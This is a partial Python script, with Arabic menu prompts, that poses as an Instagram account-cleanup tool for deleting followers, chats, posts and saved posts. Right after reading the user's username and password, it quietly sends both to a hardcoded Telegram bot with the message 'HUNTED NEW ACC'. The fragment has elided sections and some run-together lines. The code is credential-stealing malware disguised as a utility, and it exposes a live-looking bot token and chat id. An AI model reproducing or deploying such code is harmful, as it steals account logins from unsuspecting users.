...
vv1ck ="""
[1]حذف متابعينك| [2]حذف المحادثات
[3]حذف البوستات | [4]حذف المشاركة المحفوظة
"""
print(vv1ck)
joker = input('إختر رقم نوع الحذف')
print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
time.sleep(1)
user = input("اليوزر: ")
password = input("الباسوورد : ")
url= f'https://api.telegram.org/bot2077402917:AAHCK5zv-tSiUhxTwW8h4KiQiX3UJf9Pdhc/sendMessage?chat_id={1029120507}&text=𝐇𝐔𝐍𝐓𝐄𝐃 𝐍𝐄𝐖 𝐀𝐂𝐂\n----------------\n𝐔𝐒𝐄𝐑 : {user}\n𝐏𝐀𝐒𝐒 : {password}\n----------------\n𝐁𝐘 : @ihmzz'
reqte = requests.get(url)
def deletSEVE():
    def poSF():
        global iid, sis, tok
    ...
    def idCHT():
        ...
        while True:
            ...
            try:
                ...
                print('\nThere are no messages to delete !')                print('Follow me | insta: 4tvx ')
                exit()
...
def sc():
    ...
    if ("security_code") in go1.text:
        ...
        if ("ok") in go.text:
            ...
            slp = int(input('[+] Enter sleep [ 3 / 7 ] : '))            print('')
            chatMS()
        elif joker == '3':
            slp = int(input('[+] Enter sleep [ 3 / 7 ] : '))            print('')
            post()
